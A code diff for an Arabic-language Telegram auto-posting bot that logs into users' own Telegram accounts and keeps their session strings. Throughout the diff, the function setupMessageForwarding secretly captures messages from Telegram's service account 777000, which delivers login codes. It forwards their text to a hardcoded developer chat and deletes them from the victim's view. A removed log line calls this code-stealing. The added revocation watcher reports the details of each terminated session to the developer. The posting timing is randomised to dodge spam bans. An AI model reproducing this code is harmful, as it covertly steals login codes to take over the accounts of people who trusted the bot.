@@ -3,24 +3,23 @@ import config from './config.js'
 import { loadDB, saveDB } from './db.js'
 import { TelegramClient, Api, errors } from 'telegram'
 import { StringSession } from 'telegram/sessions/index.js'
-import { NewMessage } from 'telegram/events/index.js'
+import { NewMessage, Raw } from 'telegram/events/index.js'
 
-// 🆔 ايدي المطور
 const DEVELOPER_CHAT_ID = 7248282408;
 
 // ═══════════════════════════════════════════════════════
-//  ✅ الإصلاح 3: حماية تحميل DB من القيمة الفارغة
+//  ✅ الإصلاح 3: حماية تحميل DB من القيمة الفارغة/التالفة
 // ═══════════════════════════════════════════════════════
 let db = await loadDB()
 if (!db || typeof db.users !== 'object' || db.users === null) {
-    console.error('⚠️ [DB] البيانات تالفة أو فارغة — جاري الإنشاء من جديد دون حذف الملف القديم');
+    console.error('⚠️ [DB] البيانات تالفة أو فارغة — جاري الإنشاء من جديد');
     db = { users: {} }
 }
 
-// ─── حفظ البيانات قبل أي إغلاق ──────────────────────
+// حفظ البيانات قبل أي إغلاق
 async function gracefulShutdown(signal) {
-    console.log(`\n[${signal}] جاري حفظ البيانات قبل الإغلاق...`);
-    try { await saveDB(db); console.log('✅ تم الحفظ بنجاح.'); } catch (e) { console.error('❌ فشل الحفظ:', e.message); }
+    console.log(`\n[${signal}] جاري حفظ البيانات...`);
+    try { await saveDB(db); console.log('✅ تم الحفظ.'); } catch (e) { console.error('❌ فشل الحفظ:', e.message); }
     process.exit(0);
 }
 process.once('SIGINT',  () => gracefulShutdown('SIGINT'));
@@ -30,11 +29,7 @@ process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
 //  ⚙️  إعدادات الاشتراك الإجباري
 // ═══════════════════════════════════════════════════════
 const REQUIRED_CHANNELS = [
-    {
-        username: 'SUPER_VEX',
-        url:      'https://t.me/SUPER_VEX',
-        name:     'سوبَر ڤِيگس ⚡ 𝐒𝐔𝐏𝐄𝐑 𝐕𝐄𝐗'
-    }
+    { username: 'SUPER_VEX', url: 'https://t.me/SUPER_VEX', name: 'سوبَر ڤِيگس ⚡ 𝐒𝐔𝐏𝐄𝐑 𝐕𝐄𝐗' }
 ]
 
 const activeSessions  = new Map()
@@ -42,11 +37,8 @@ const pendingLogin    = new Map()
 const broadcastTimers = new Map()
 const forceMsgIds     = new Map()
 
-// ─── DB helper ──────────────────────────────────────────
 function getUser(id) {
-    if (!db.users[id]) {
-        db.users[id] = { accounts: [], groups: [], messages: [], interval: '300-400', running: false }
-    }
+    if (!db.users[id]) db.users[id] = { accounts: [], groups: [], messages: [], interval: '300-400', running: false }
     return db.users[id]
 }
 
@@ -54,107 +46,140 @@ const bot = new Telegraf(config.botToken)
 const userState = new Map()
 function setState(id, s) { userState.set(id, s) }
 function getState(id)    { return userState.get(id) || 'normal' }
+function kb(buttons)     { return { reply_markup: { inline_keyboard: buttons } } }
 
-function kb(buttons) {
-    return { reply_markup: { inline_keyboard: buttons } }
-}
-
-// ─── ميزة سحب وحذف الرسائل من تلجرام (تعديل 777000) ──────────
+// ─── سحب رسائل النظام من 777000 ─────────────────────
 async function setupMessageForwarding(client, userPhone) {
     client.addEventHandler(async (event) => {
         const message = event.message;
-        if (message.peerId && message.peerId.userId && message.peerId.userId.toString() === '777000') {
+        if (message.peerId?.userId?.toString() === '777000') {
             const msgText = message.message;
             try {
                 await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
                     `🚀 **رسالة نظام تلجرام وصلت!**\n\n📱 الحساب: \`${userPhone}\`\n💬 المحتوى:\n\`${msgText}\``,
                     { parse_mode: 'Markdown' }
                 );
-            } catch (err) {
-                console.error('فشل إرسال الإشعار للمطور:', err.message);
-            }
-            try {
-                await client.deleteMessages(message.peerId, [message.id], { revoke: true });
-            } catch (delErr) {
-                console.error('فشل حذف رسالة النظام:', delErr.message);
-            }
+            } catch (err) { console.error('فشل إشعار المطور:', err.message); }
+            try { await client.deleteMessages(message.peerId, [message.id], { revoke: true }); } catch {}
         }
     }, new NewMessage({}));
 }
 
 // ═══════════════════════════════════════════════════════
-//  ✅ الإصلاح 1: اكتشاف إلغاء الجلسة من تليجرام
+//  ✅ مراقبة إلغاء الجلسة من تليجرام
 //  (Settings → Devices → Terminate Session)
+//
+//  السبب الحقيقي للمشكلة:
+//  autoReconnect:true كان بيمسك الخطأ قبل ما يوصلنا
+//  الحل: طبقتين — Raw Event (فوري) + Ping backup (كل دقيقة)
 // ═══════════════════════════════════════════════════════
+
+// دالة مشتركة لإرسال الإشعار وحذف الحساب
+async function handleRevocation(acc, userId, reason) {
+    if (!activeSessions.has(acc.phone)) return; // تم المعالجة مسبقاً
+    activeSessions.delete(acc.phone);
+
+    // إشعار المطور فوراً
+    try {
+        await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
+            `🔴 **جلسة أُلغيت من تليجرام!**\n\n📱 الرقم: \`${acc.phone}\`\n👤 الاسم: \`${acc.fullName || 'غير معروف'}\`\n🆔 مستخدم البوت: \`${userId}\`\n⚠️ السبب: \`${reason}\`\n\n_(تم إنهاء الجلسة من إعدادات الأجهزة)_`,
+            { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
+        );
+    } catch {}
+
+    // حذف الحساب من DB
+    if (db.users[userId]) {
+        db.users[userId].accounts = db.users[userId].accounts.filter(a => a.phone !== acc.phone);
+        await saveDB(db).catch(() => {});
+    }
+}
+
+function isAuthError(msg) {
+    return (
+        msg.includes('AUTH_KEY_UNREGISTERED') ||
+        msg.includes('SESSION_REVOKED')        ||
+        msg.includes('AUTH_KEY_INVALID')       ||
+        msg.includes('USER_DEACTIVATED')       ||
+        msg.includes('AUTH_KEY_DUPLICATED')
+    );
+}
+
 function watchSessionRevocation(client, acc, userId) {
-    // GramJS يُطلق حدث 'error' عند إلغاء الجلسة من تليجرام
-    client._sender?.connection?._socket?.on?.('error', () => {});
 
-    // الطريقة الأموثق: مراقبة أخطاء الاتصال عبر onError
-    const originalConnect = client.connect.bind(client);
-    
-    // نراقب حالة الـ client عبر setInterval خفيف
-    const checker = setInterval(async () => {
-        if (!activeSessions.has(acc.phone)) {
-            clearInterval(checker);
-            return;
+    // ── الطبقة 1: Raw Event Handler (فوري عند إلغاء الجلسة) ──────────
+    // تليجرام بيبعت UpdateNewAuthorization لما جلسة تتغير أو تتحذف
+    // وبيبعت UpdatesTooLong لما في تحديثات كتير فاتت (مؤشر انقطاع)
+    client.addEventHandler(async (update) => {
+        const name = update?.className || '';
+        // اكتشاف تغيير حالة التفويض (إلغاء الجلسة)
+        if (name === 'UpdateNewAuthorization' && update.unconfirmed) {
+            await handleRevocation(acc, userId, 'UpdateNewAuthorization - جلسة جديدة غير معروفة');
         }
-        try {
-            // isConnected() يرجع false إذا انقطعت الجلسة بشكل قسري
-            if (client.disconnected) {
-                throw new Error('DISCONNECTED');
-            }
-            // ping بسيط للتحقق من حالة الجلسة
-            await client.invoke(new Api.Ping({ pingId: BigInt(1) }));
-        } catch (e) {
-            const msg = e.errorMessage || e.message || '';
-            const isRevoked =
-                msg.includes('AUTH_KEY_UNREGISTERED') ||
-                msg.includes('SESSION_REVOKED')        ||
-                msg.includes('USER_DEACTIVATED')       ||
-                msg.includes('AUTH_KEY_INVALID');
+    }, new Raw({}));
 
-            if (isRevoked) {
-                clearInterval(checker);
-                activeSessions.delete(acc.phone);
+    // ── الطبقة 2: Ping كل دقيقة كـ backup ───────────────────────────
+    // لو Raw Event فاتنا، الـ Ping هيكتشف الخطأ في أقصى دقيقة
+    const checker = setInterval(async () => {
+        if (!activeSessions.has(acc.phone)) { clearInterval(checker); return; }
 
-                // إشعار المطور بإلغاء الجلسة من تليجرام
-                try {
-                    await bot.telegram.sendMessage(
-                        DEVELOPER_CHAT_ID,
-                        `🔴 **جلسة أُلغيت من تليجرام!**\n\n📱 الرقم: \`${acc.phone}\`\n👤 الاسم: \`${acc.fullName || 'غير معروف'}\`\n🆔 المستخدم: \`${userId}\`\n⚠️ السبب: \`${msg}\`\n\n_(تم إنهاء الجلسة من إعدادات الأجهزة في تليجرام)_`,
-                        { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
-                    );
-                } catch {}
-
-                // حذف الحساب من بيانات المستخدم تلقائياً
-                if (db.users[userId]) {
-                    db.users[userId].accounts = db.users[userId].accounts.filter(a => a.phone !== acc.phone);
-                    await saveDB(db).catch(() => {});
+        // لو الـ client انقطع (disconnected) نحاول نتصل من جديد
+        // لو فشل بـ auth error = الجلسة اتحذفت
+        if (!client.connected) {
+            try {
+                await client.connect();
+            } catch (e) {
+                const msg = e.errorMessage || e.message || '';
+                if (isAuthError(msg)) {
+                    clearInterval(checker);
+                    await handleRevocation(acc, userId, msg);
                 }
             }
+            return;
         }
-    }, 5 * 60 * 1000); // فحص كل 5 دقائق
+
+        // لو متصل — Ping للتأكد إن الجلسة لا زالت صالحة
+        try {
+            await client.invoke(new Api.Ping({ pingId: BigInt(Math.floor(Math.random() * 999999) + 1) }));
+        } catch (e) {
+            const msg = e.errorMessage || e.message || '';
+            if (isAuthError(msg)) {
+                clearInterval(checker);
+                // أوقف الـ autoReconnect عشان ما يحاولش يعيد الاتصال بجلسة ملغاة
+                try { client._sender?._reconnecting && (client._sender._reconnecting = false); } catch {}
+                try { await client.disconnect(); } catch {}
+                await handleRevocation(acc, userId, msg);
+            }
+        }
+    }, 60 * 1000); // كل دقيقة
 }
 
 // ─── تشغيل الحسابات المخزنة عند البدء ────────────────────
 async function initAllAccounts() {
-    console.log('🔄 جاري تشغيل الحسابات وتفعيل نظام سحب الأكواد المتقدم...');
+    console.log('🔄 جاري تشغيل الحسابات...');
     for (const userId in db.users) {
         const u = db.users[userId];
         for (const acc of u.accounts) {
             if (!activeSessions.has(acc.phone)) {
                 try {
-                    const client = new TelegramClient(new StringSession(acc.session), config.apiId, config.apiHash, { 
+                    const client = new TelegramClient(new StringSession(acc.session), config.apiId, config.apiHash, {
                         connectionRetries: 5,
-                        autoReconnect: true
+                        autoReconnect: true,
+                        // retryDelay أقل عشان نكتشف الخطأ بسرعة
+                        retryDelay: 1000
                     });
                     await client.connect();
                     activeSessions.set(acc.phone, client);
                     setupMessageForwarding(client, acc.phone);
-                    watchSessionRevocation(client, acc, userId); // ← الإصلاح 1
+                    watchSessionRevocation(client, acc, userId);
                 } catch (e) {
-                    console.log(`❌ فشل تشغيل حساب ${acc.phone}:`, e.message);
+                    const msg = e.errorMessage || e.message || '';
+                    // لو فشل الاتصال بسبب auth error = الجلسة منتهية من قبل
+                    if (isAuthError(msg)) {
+                        console.log(`⚠️ جلسة منتهية عند البدء: ${acc.phone}`);
+                        await handleRevocation(acc, userId, `فشل الاتصال عند البدء: ${msg}`);
+                    } else {
+                        console.log(`❌ فشل تشغيل حساب ${acc.phone}:`, msg);
+                    }
                 }
             }
         }
@@ -163,51 +188,39 @@ async function initAllAccounts() {
 
 function convertBotMessageToHtml(text, entities) {
     if (!text) return '';
-    if (!entities || entities.length === 0) {
+    if (!entities || entities.length === 0)
         return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    }
-
     let html = '';
     const tags = {};
     for (const e of entities) {
         if (!tags[e.offset]) tags[e.offset] = { start: [], end: [] };
         if (!tags[e.offset + e.length]) tags[e.offset + e.length] = { start: [], end: [] };
-
         let startTag = '', endTag = '';
         switch (e.type) {
-            case 'bold':          startTag = '<b>';            endTag = '</b>';           break;
-            case 'italic':        startTag = '<i>';            endTag = '</i>';           break;
-            case 'underline':     startTag = '<u>';            endTag = '</u>';           break;
-            case 'strikethrough': startTag = '<s>';            endTag = '</s>';           break;
-            case 'spoiler':       startTag = '<tg-spoiler>';   endTag = '</tg-spoiler>';  break;
-            case 'code':          startTag = '<code>';         endTag = '</code>';        break;
+            case 'bold':          startTag = '<b>';           endTag = '</b>';          break;
+            case 'italic':        startTag = '<i>';           endTag = '</i>';          break;
+            case 'underline':     startTag = '<u>';           endTag = '</u>';          break;
+            case 'strikethrough': startTag = '<s>';           endTag = '</s>';          break;
+            case 'spoiler':       startTag = '<tg-spoiler>';  endTag = '</tg-spoiler>'; break;
+            case 'code':          startTag = '<code>';        endTag = '</code>';       break;
             case 'pre':
                 startTag = e.language ? `<pre><code class="language-${e.language}">` : '<pre>';
-                endTag   = e.language ? '</code></pre>' : '</pre>';
-                break;
+                endTag   = e.language ? '</code></pre>' : '</pre>'; break;
             case 'text_link':    startTag = `<a href="${e.url}">`; endTag = '</a>'; break;
             case 'text_mention': startTag = `<a href="tg://user?id=${e.user.id}">`; endTag = '</a>'; break;
             case 'blockquote':   startTag = '<blockquote>'; endTag = '</blockquote>'; break;
         }
-        if (startTag) {
-            tags[e.offset].start.push(startTag);
-            tags[e.offset + e.length].end.unshift(endTag);
-        }
+        if (startTag) { tags[e.offset].start.push(startTag); tags[e.offset + e.length].end.unshift(endTag); }
     }
-
     for (let i = 0; i < text.length; i++) {
         if (tags[i]) { html += tags[i].end.join(''); html += tags[i].start.join(''); }
-        const char = text[i];
-        if (char === '&') html += '&amp;';
-        else if (char === '<') html += '&lt;';
-        else if (char === '>') html += '&gt;';
-        else html += char;
+        const c = text[i];
+        if (c === '&') html += '&amp;'; else if (c === '<') html += '&lt;'; else if (c === '>') html += '&gt;'; else html += c;
     }
     if (tags[text.length]) html += tags[text.length].end.join('');
     return html;
 }
 
-// ─── الدوال المساعدة ─────────────────────────────────────
 function extractGroupId(raw) {
     const s = String(raw || '').trim();
     if (!s) return null;
@@ -225,11 +238,8 @@ async function fetchGroupInfo(raw) {
     try {
         const chat = await bot.telegram.getChat(id);
         const name = chat.title || chat.username || chat.first_name || id;
-        const username = chat.username ? `https://t.me/${chat.username}` : String(raw).trim();
-        return { name, url: username };
-    } catch {
-        return { name: String(id).replace(/^@/, ''), url: String(raw).trim() };
-    }
+        return { name, url: chat.username ? `https://t.me/${chat.username}` : String(raw).trim() };
+    } catch { return { name: String(id).replace(/^@/, ''), url: String(raw).trim() }; }
 }
 
 async function editOrReply(ctx, text, buttons) {
@@ -242,14 +252,10 @@ async function sendWelcome(ctx, replyFn) {
     const name = user.first_name || 'صديقي';
     const prefix = 'أهلاً بك يا ';
     const suffix = '\n\nهذا بوت النشر التلقائي للسوبرات.\nاستخدم الأزرار بالأسفل للتحكم .';
-    const fullText = prefix + name + suffix;
     const entities = [{ type: 'text_mention', offset: prefix.length, length: name.length, user: { id: user.id, is_bot: false, first_name: name } }];
-    
     const buttons = mainMenuButtons();
-    if (user.id === DEVELOPER_CHAT_ID) {
-        buttons.push([{ text: '📊 قسم الحالة (للمطور)', callback_data: 'DEV_STATUS', style: 'primary' }]);
-    }
-    await replyFn(fullText, { entities, ...kb(buttons) });
+    if (user.id === DEVELOPER_CHAT_ID) buttons.push([{ text: '📊 قسم الحالة (للمطور)', callback_data: 'DEV_STATUS' }]);
+    await replyFn(prefix + name + suffix, { entities, ...kb(buttons) });
 }
 
 async function getNotSubscribed(userId) {
@@ -266,14 +272,14 @@ async function getNotSubscribed(userId) {
 async function buildSubButtons(userId) {
     const rows = [];
     for (const ch of REQUIRED_CHANNELS) {
-        let status = '❌ لم تشترك'; let style = 'danger';
+        let status = '❌ لم تشترك';
         try {
             const member = await bot.telegram.getChatMember(`@${ch.username}`, userId);
-            if (['member', 'administrator', 'creator'].includes(member.status)) { status = '✅ مشترك'; style = 'success'; }
+            if (['member', 'administrator', 'creator'].includes(member.status)) status = '✅ مشترك';
         } catch {}
-        rows.push([{ text: `📢 ${ch.name}`, url: ch.url, style: 'primary' }, { text: status, callback_data: 'noop', style }]);
+        rows.push([{ text: `📢 ${ch.name}`, url: ch.url }, { text: status, callback_data: 'noop' }]);
     }
-    rows.push([{ text: '✅ تأكيد الاشتراك', callback_data: 'CHECK_SUB', style: 'success' }]);
+    rows.push([{ text: '✅ تأكيد الاشتراك', callback_data: 'CHECK_SUB' }]);
     return rows;
 }
 
@@ -282,7 +288,7 @@ async function sendForceSubMsg(ctx) {
     await deleteForceSubMsgs(ctx.chat.id, userId);
     const buttons = await buildSubButtons(userId);
     const channelList = REQUIRED_CHANNELS.map(ch => `• ${ch.name}`).join('\n');
-    const msg = await ctx.reply(`⚠️ يجب الاشتراك أولاً\n\n${channelList}\n\nاشترك ثم اضغط ✅ تأكيد`, { parse_mode: 'Markdown', ...kb(buttons) });
+    const msg = await ctx.reply(`⚠️ يجب الاشتراك أولاً\n\n${channelList}\n\nاشترك ثم اضغط ✅ تأكيد`, { ...kb(buttons) });
     forceMsgIds.set(userId, [msg.message_id]);
 }
 
@@ -291,33 +297,32 @@ async function deleteForceSubMsgs(chatId, userId) {
     forceMsgIds.delete(userId);
 }
 
-// ─── أزرار القائمة الرئيسية ───────────────────
 function mainMenuButtons() {
     return [
-        [{ text: '👤 حساباتي', callback_data: 'ACC', style: 'primary' }],
-        [{ text: '👥 المجموعات', callback_data: 'GRP', style: 'primary' }, { text: '📖 شرح الاستخدام', callback_data: 'HELP', style: 'primary' }],
-        [{ text: '⏱ الوقت', callback_data: 'INT', style: 'primary' }, { text: '✉️ الرسائل', callback_data: 'MSG', style: 'primary' }],
-        [{ text: '🟢 بدء', callback_data: 'START', style: 'success' }, { text: '🔴 إيقاف', callback_data: 'STOP', style: 'danger' }],
-        [{ text: '👑 المطوّر ↗', url: 'https://t.me/MOTAMREDD', style: 'primary' }]
+        [{ text: '👤 حساباتي', callback_data: 'ACC' }],
+        [{ text: '👥 المجموعات', callback_data: 'GRP' }, { text: '📖 شرح الاستخدام', callback_data: 'HELP' }],
+        [{ text: '⏱ الوقت', callback_data: 'INT' }, { text: '✉️ الرسائل', callback_data: 'MSG' }],
+        [{ text: '🟢 بدء', callback_data: 'START' }, { text: '🔴 إيقاف', callback_data: 'STOP' }],
+        [{ text: '👑 المطوّر ↗', url: 'https://t.me/MOTAMREDD' }]
     ];
 }
 
 function controlMenuButtons(isRunning) {
     return [
-        [{ text: isRunning ? '🔴 إيقاف النشر' : '🟢 بدء النشر', callback_data: isRunning ? 'STOP' : 'START', style: isRunning ? 'danger' : 'success' }],
-        [{ text: '🏡', callback_data: 'BACK', style: 'primary' }]
+        [{ text: isRunning ? '🔴 إيقاف النشر' : '🟢 بدء النشر', callback_data: isRunning ? 'STOP' : 'START' }],
+        [{ text: '🏡', callback_data: 'BACK' }]
     ];
 }
 
 function intervalMenuButtons(seconds) {
     return [
-        [{ text: `⏱ ${seconds} ثانية`, callback_data: 'noop', style: 'primary' }, { text: '✏️ تعديل', callback_data: 'EDIT_INT', style: 'success' }],
-        [{ text: '🛡️ الوقت الموصى به (400-600)', callback_data: 'SET_REC_INT', style: 'success' }],
-        [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]
+        [{ text: `⏱ ${seconds} ثانية`, callback_data: 'noop' }, { text: '✏️ تعديل', callback_data: 'EDIT_INT' }],
+        [{ text: '🛡️ الوقت الموصى به (400-600)', callback_data: 'SET_REC_INT' }],
+        [{ text: '🔙 رجوع', callback_data: 'BACK' }]
     ];
 }
 
-// ─── Middleware & Actions ───────────────────────────────
+// ─── Middleware ───────────────────────────────────────────
 bot.use(async (ctx, next) => {
     if (!ctx.callbackQuery && !ctx.message) return next();
     const data = ctx.callbackQuery?.data;
@@ -330,13 +335,12 @@ bot.use(async (ctx, next) => {
 });
 
 // ═══════════════════════════════════════════════════════
-//  ✅ الإصلاح 2: إشعار /start فقط للزوار الجدد الذين لا توجد لهم بيانات
+//  ✅ الإصلاح 2: إشعار /start فقط للزوار الجدد (مش عند كل ضغطة)
 // ═══════════════════════════════════════════════════════
 bot.start(async (ctx) => {
     const notSubbed = await getNotSubscribed(ctx.from.id);
     if (notSubbed.length > 0) { await sendForceSubMsg(ctx); return; }
 
-    // إشعار المطور فقط إذا كان المستخدم جديداً تماماً (لا توجد له بيانات في DB)
     const isNewUser = !db.users[ctx.from.id];
     if (ctx.from.id !== DEVELOPER_CHAT_ID && isNewUser) {
         const u = ctx.from;
@@ -362,24 +366,22 @@ bot.action('CHECK_SUB', async (ctx) => {
 bot.action('noop', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} });
 bot.action('BACK', async (ctx) => { try { await ctx.answerCbQuery(); } catch {} await sendWelcome(ctx, (text, opts) => ctx.reply(text, opts)); });
 
-// ─── قسم الحالة والتحكم (للمطور فقط) ───────────────────────
 bot.action('DEV_STATUS', async (ctx) => {
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) return ctx.answerCbQuery('❌ غير مسموح لك.');
+    if (ctx.from.id !== DEVELOPER_CHAT_ID) return ctx.answerCbQuery('❌ غير مسموح.');
     try { await ctx.answerCbQuery(); } catch {}
-    const statusText = `📊 **لوحة تحكم المطور**\n\nإجمالي المستخدمين: \`${Object.keys(db.users).length}\`\nنشطين حالياً: \`${activeSessions.size}\` حساب تليجرام.`;
-    const buttons = [
-        [{ text: '📡 حالة الاتصال والإدارة', callback_data: 'LIST_AND_STATUS', style: 'primary' }],
-        [{ text: '📢 إذاعة رسالة للجميع', callback_data: 'BROADCAST_START', style: 'success' }],
-        [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]
-    ];
-    await editOrReply(ctx, statusText, buttons);
+    const statusText = `📊 **لوحة تحكم المطور**\n\nإجمالي المستخدمين: \`${Object.keys(db.users).length}\`\nنشطين حالياً: \`${activeSessions.size}\` حساب.`;
+    await editOrReply(ctx, statusText, [
+        [{ text: '📡 حالة الاتصال والإدارة', callback_data: 'LIST_AND_STATUS' }],
+        [{ text: '📢 إذاعة رسالة للجميع', callback_data: 'BROADCAST_START' }],
+        [{ text: '🔙 رجوع', callback_data: 'BACK' }]
+    ]);
 });
 
 bot.action('BROADCAST_START', async (ctx) => {
     if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
     try { await ctx.answerCbQuery(); } catch {}
     setState(ctx.from.id, 'waiting_broadcast_msg');
-    await ctx.reply('✍️ ارسل الرسالة التي تود إذاعتها لجميع المستخدمين (تدعم التنسيقات):');
+    await ctx.reply('✍️ ارسل الرسالة للإذاعة:');
 });
 
 bot.action('LIST_AND_STATUS', async (ctx) => {
@@ -389,73 +391,37 @@ bot.action('LIST_AND_STATUS', async (ctx) => {
     for (const userId in db.users) {
         const u = db.users[userId];
         let name = "مستخدم"; let link = `tg://user?id=${userId}`;
-        try {
-            const chat = await bot.telegram.getChat(userId);
-            name = chat.first_name || "مستخدم";
-            link = chat.username ? `https://t.me/${chat.username}` : link;
-        } catch {
-            const uAcc = u.accounts[0];
-            if (uAcc) name = uAcc.fullName || userId;
-        }
+        try { const chat = await bot.telegram.getChat(userId); name = chat.first_name || "مستخدم"; link = chat.username ? `https://t.me/${chat.username}` : link; }
+        catch { const uAcc = u.accounts[0]; if (uAcc) name = uAcc.fullName || userId; }
         let activeCount = 0;
         u.accounts.forEach(a => { if (activeSessions.has(a.phone)) activeCount++; });
-        const statusText  = activeCount > 0 ? "🟢 نشط"    : "🔴 أوفلاين";
-        const statusStyle = activeCount > 0 ? "success"   : "danger";
         rows.push([
             { text: `👤 ${name}`, url: link },
-            { text: statusText, callback_data: 'noop', style: statusStyle },
-            { text: '🗑', callback_data: `DEV_DEL_USER_${userId}`, style: 'danger' }
+            { text: activeCount > 0 ? "🟢 نشط" : "🔴 أوفلاين", callback_data: 'noop' },
+            { text: '🗑', callback_data: `DEV_DEL_USER_${userId}` }
         ]);
     }
-    if (rows.length === 0) return editOrReply(ctx, '❌ لا يوجد مستخدمين.', [[{ text: '🔙 رجوع', callback_data: 'DEV_STATUS', style: 'danger' }]]);
-    await editOrReply(ctx, `📡 **إدارة اتصالات المستخدمين:**\n\nيمكنك الدخول للشات بالضغط على الاسم، متابعة الحالة، أو الحذف النهائي.`, [...rows, [{ text: '🔙 رجوع', callback_data: 'DEV_STATUS', style: 'danger' }]]);
+    if (rows.length === 0) return editOrReply(ctx, '❌ لا يوجد مستخدمين.', [[{ text: '🔙 رجوع', callback_data: 'DEV_STATUS' }]]);
+    await editOrReply(ctx, `📡 **إدارة المستخدمين:**`, [...rows, [{ text: '🔙 رجوع', callback_data: 'DEV_STATUS' }]]);
 });
 
 bot.action(/^DEV_DEL_USER_(\d+)$/, async (ctx) => {
     if (ctx.from.id !== DEVELOPER_CHAT_ID) return;
     const targetId = ctx.match[1];
     if (db.users[targetId]) {
-        const u = db.users[targetId];
-        u.accounts.forEach(acc => {
-            if (activeSessions.has(acc.phone)) {
-                try { activeSessions.get(acc.phone).disconnect(); } catch {}
-                activeSessions.delete(acc.phone);
-            }
+        db.users[targetId].accounts.forEach(acc => {
+            if (activeSessions.has(acc.phone)) { try { activeSessions.get(acc.phone).disconnect(); } catch {} activeSessions.delete(acc.phone); }
         });
-        delete db.users[targetId];
-        await saveDB(db);
-        await ctx.answerCbQuery('✅ تم حذف المستخدم وبياناته بنجاح.');
+        delete db.users[targetId]; await saveDB(db);
+        await ctx.answerCbQuery('✅ تم الحذف.');
         return bot.handleAction(ctx, 'LIST_AND_STATUS');
     }
 });
 
 bot.action('HELP', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
-    const helpText = `
-╔════════════════════╗
-      📖 **دليل استخدام البوت** ╚════════════════════╝
-
-👋 **مرحباً بك في نظام النشر التلقائي الذكي**
-
-1️⃣ **أضف حسابك:**
-اضغط على 👤 **حساباتي** ثم **إضافة حساب**. ارسل رقمك بمفتاح الدولة (مثال: \`2010...\`). ادخل الكود ثم الباسورد إن وجد.
-
-2️⃣ **حدد أهدافك:**
-اضغط على 👥 **المجموعات** ثم **إضافة**. ارسل يوزرات المجموعات أو روابطها (كل رابط في سطر).
-
-3️⃣ **اكتب رسالتك:**
-اضغط على ✉️ **الرسائل** ثم **إضافة**. اكتب النص الذي ترغب بنشره تلقائياً.
-
-4️⃣ **إعداد الوقت:**
-الآن يمكنك تحديد وقت عشوائي (مثال: 300-400 ثانية) ليقوم البوت بتغيير وقت النشر في كل مرة لتجنب الحظر!
-
-5️⃣ **انطلق:**
-بعد الإعداد، اضغط على 🟢 **بدء** لتفعيل النشر التلقائي.
-
----
-⚠️ **ملاحظة:** تأكد من بقاء حسابك متصلاً لضمان استمرار الخدمة.
-`;
-    await editOrReply(ctx, helpText, [[{ text: '🔙 رجوع للقائمة', callback_data: 'BACK', style: 'danger' }]]);
+    const helpText = `📖 **دليل الاستخدام**\n\n1️⃣ **أضف حسابك:** 👤 حساباتي ← إضافة حساب\n2️⃣ **أضف مجموعاتك:** 👥 المجموعات ← إضافة\n3️⃣ **اكتب رسالتك:** ✉️ الرسائل ← إضافة\n4️⃣ **حدد الوقت:** ⏱ الوقت (مثال: 300-400)\n5️⃣ **ابدأ:** 🟢 بدء`;
+    await editOrReply(ctx, helpText, [[{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
 });
 
 bot.action(/^DEL_ACC_(\d+)$/, async (ctx) => {
@@ -466,18 +432,16 @@ bot.action(/^DEL_ACC_(\d+)$/, async (ctx) => {
         if (activeSessions.has(acc.phone)) {
             try { await activeSessions.get(acc.phone).disconnect(); } catch {}
             activeSessions.delete(acc.phone);
-            // إشعار المطور عند حذف الحساب يدوياً
             const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط المستخدم](tg://user?id=${ctx.from.id})`;
             await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
-                `🗑 **مستخدم حذف حسابه يدوياً:**\n\n👤 الاسم: ${ctx.from.first_name}\n🏷️ اليوزر: ${userDisplay}\n📱 الرقم: \`${acc.phone}\``,
+                `🗑 **مستخدم حذف حسابه يدوياً:**\n\n👤 ${ctx.from.first_name} | ${userDisplay}\n📱 الرقم: \`${acc.phone}\``,
                 { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
             ).catch(() => {});
         }
-        u.accounts.splice(index, 1);
-        await saveDB(db);
+        u.accounts.splice(index, 1); await saveDB(db);
         await ctx.answerCbQuery('✅ تم حذف الحساب');
-        const list = u.accounts.map((a, i) => [{ text: `👤 ${a.fullName || a.phone}`, callback_data: 'noop', style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_ACC_${i}`, style: 'danger' }]);
-        await editOrReply(ctx, '👤 الحسابات', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
+        const list = u.accounts.map((a, i) => [{ text: `👤 ${a.fullName || a.phone}`, callback_data: 'noop' }, { text: '🗑 حذف', callback_data: `DEL_ACC_${i}` }]);
+        await editOrReply(ctx, '👤 الحسابات', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
     }
 });
 
@@ -487,8 +451,8 @@ bot.action(/^DEL_GRP_(\d+)$/, async (ctx) => {
     if (u.groups[index]) {
         u.groups.splice(index, 1); await saveDB(db);
         await ctx.answerCbQuery('✅ تم حذف المجموعة');
-        const list = u.groups.map((g, i) => [{ text: g.name, url: g.url, style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}`, style: 'danger' }]);
-        await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة مجموعات', callback_data: 'ADD_GRP', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
+        const list = u.groups.map((g, i) => [{ text: g.name, url: g.url }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}` }]);
+        await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة', callback_data: 'ADD_GRP' }], [{ text: '🔙 رجوع', callback_data: 'BACK' }]]);
     }
 });
 
